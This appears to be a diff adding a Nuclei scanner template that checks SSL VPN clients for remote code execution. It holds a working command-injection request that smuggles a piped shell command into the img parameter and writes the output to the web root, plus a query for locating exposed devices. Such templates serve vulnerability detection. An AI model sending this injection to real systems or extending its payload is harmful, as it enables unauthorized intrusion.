@@ -1,0 +1,40 @@
+id: sslvpn-client-rce
+
+info:
+  name: SSL VPN Client - Remote Code Execution
+  author: DhiyaneshDK
+  severity: critical
+  description: SSL VPN Client is vulnerable to RCE.
+  reference:
+    - https://github.com/server2565543706/Poc/blob/master/POC/anquantongsha.py
+    - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/security_products_rce.py
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="/webui/images/default/default/alert_close.jpg"
+  tags: sslvpn,rce,intrusive,vuln
+variables:
+  filename: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        GET /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /sslvpn/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
+
+      - type: word
+        part: header_2
+        words:
+          - 'text/plain'
+# digest: 4a0a00473045022043a2d613fd68dd02fa90bc9b2982101c9023023085376c8ff359aa9329ae4e830221009b245225cf87f5c71e59bf847734327994fad5180c1830421ba1a9e3805844a5:922c64590222798bb761d5b6d8e72950
